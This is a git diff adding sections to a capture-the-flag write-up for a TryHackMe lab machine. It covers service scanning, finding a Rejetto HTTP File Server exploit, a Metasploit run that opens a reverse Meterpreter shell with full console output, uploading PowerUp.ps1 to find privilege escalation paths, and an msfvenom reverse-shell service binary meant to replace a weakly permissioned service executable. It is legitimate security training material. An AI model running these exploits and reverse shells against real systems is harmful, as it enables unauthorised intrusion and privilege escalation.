@@ -101,8 +101,187 @@ Warning: OSScan results may be unreliable because we could not find at least 1 o
 ```
 
 --- 
-Task1: Employee of the month:
+## Task 1: Employee of the month:
 
 ![](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Easy/MountainSteel/images/Screenshot%20From%202026-07-04%2020-55-20.png)
 
+Bill Harper from the URL.
+
+## Task 2: Scan the machine with nmap. What is the other port running a web server on?
+
+I tried the most obvious port: 8080
+
+![](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Easy/MountainSteel/images/Screenshot%20From%202026-07-04%2020-55-56.png)
+
+## Task 3: Take a look at the other web server. What file server is running?
+
+Rejetto HTTP File Server
+
+## Task 4: What is the CVE number to exploit this file server?
+
+```bash
+┌──(root㉿kali)-[~]
+└─# searchsploit Rejetto HTTP File Server
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                    |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                                                            | windows/remote/34926.rb
+Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities                                                                                                                 | windows/remote/31056.py
+Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                                                                    | multiple/remote/30850.txt
+Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                                               | windows/remote/34668.txt
+Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                                               | windows/remote/39161.py
+Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                                                          | windows/webapps/34852.txt
+Rejetto HTTP File Server 2.3m - Remote Code Execution (RCE)                                                                                                                       | typescript/webapps/52102.py
+Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                                                                       | windows/webapps/49125.py
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+> Nikto scan results reveals version:
+
+```bash
+┌──(root㉿kali)-[~]
+└─# nikto -h 10.128.149.9:8080
+- Nikto v2.6.0
+---------------------------------------------------------------------------
++ Target IP:          10.128.149.9
++ Target Hostname:    10.128.149.9
++ Target Port:        8080
++ Platform:           Unknown
++ Start Time:         2026-07-07 07:19:52 (GMT-4)
+---------------------------------------------------------------------------
++ Server: HFS 2.3
+```
+
+[Exploit db result](https://www.exploit-db.com/exploits/39161) for the 2.3 version.
+
+## Task 5: Use Metasploit to get an initial shell. What is the user flag?
+
+```shell
+msf > search rejetto http
+
+Matching Modules
+================
+
+   #  Name                                                 Disclosure Date  Rank       Check  Description
+   -  ----                                                 ---------------  ----       -----  -----------
+   0  exploit/windows/http/rejetto_hfs_rce_cve_2024_23692  2024-05-25       excellent  Yes    Rejetto HTTP File Server (HFS) Unauthenticated Remote Code Execution
+   1  exploit/windows/http/rejetto_hfs_exec                2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
+
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/http/rejetto_hfs_exec
+
+msf > use 1
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf exploit(windows/http/rejetto_hfs_exec) > options
+
+Module options (exploit/windows/http/rejetto_hfs_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   HTTPDELAY  10               no        Seconds to wait before terminating web server
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, socks5h, sapni, http, socks4
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SRVSSL     false            no        Negotiate SSL/TLS for local server connections
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       The path of the web application
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.0.2.5         yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+msf exploit(windows/http/rejetto_hfs_exec) > set lhost tun0
+lhost => 192.168.152.35
+msf exploit(windows/http/rejetto_hfs_exec) > exploit
+[*] Started reverse TCP handler on 192.168.152.35:4444 
+[*] Using URL: http://192.168.152.35:8080/uUYk2IHhBjnw3Fp
+[*] Server started.
+[*] Sending a malicious request to /
+[*] Payload request received: /uUYk2IHhBjnw3Fp
+[*] Sending stage (199238 bytes) to 10.128.149.9
+[!] Tried to delete %TEMP%\QJbAL.vbs, unknown result
+[*] Meterpreter session 1 opened (192.168.152.35:4444 -> 10.128.149.9:49303) at 2026-07-07 07:28:04 -0400
+[*] Server stopped.
+
+meterpreter >
+meterpreter > cd Desktop
+meterpreter > ls
+Listing: C:\Users\bill\Desktop
+==============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2019-09-27 07:07:07 -0400  desktop.ini
+100666/rw-rw-rw-  70    fil   2019-09-27 08:42:38 -0400  user.txt
+
+meterpreter > type user.txt
+[-] Unknown command: type. Run the help command for more details.
+meterpreter > cat user.txt
+��b04763b6fcf51fcd7c13abc7db4fd365
+```
+
+Thus getting : user.txt
+
+## Task 6: Privilege Escalation
+
+> Let's download PowerUp.ps1 script, and upload it to look for privEsc vectors:
+
+```
+Tab 2:
+curl -O https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
+
+Tab 1:
+meterpreter > upload /root/PowerUp.ps1
+[*] Uploading  : /root/PowerUp.ps1 -> PowerUp.ps1
+[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /root/PowerUp.ps1 -> PowerUp.ps1
+[*] Completed  : /root/PowerUp.ps1 -> PowerUp.ps1
+meterpreter > ls
+Listing: C:\Users\bill\Desktop
+==============================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+100666/rw-rw-rw-  600580  fil   2026-07-07 07:34:29 -0400  PowerUp.ps1
+100666/rw-rw-rw-  282     fil   2019-09-27 07:07:07 -0400  desktop.ini
+100666/rw-rw-rw-  70      fil   2019-09-27 08:42:38 -0400  user.txt
+
+# LOAD POWERSHELL
+
+meterpreter > load powershell
+Loading extension powershell...Success.
+meterpreter > powershell_shell
+PS > . .\PowerUp.ps1
+PS > Invoke-AllChecks
+
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+```
+
+> The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!
+
+> Use msfvenom to generate a reverse shell as an Windows executable.
+
+> msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
+
+> Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.
+
+> Note: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.
 
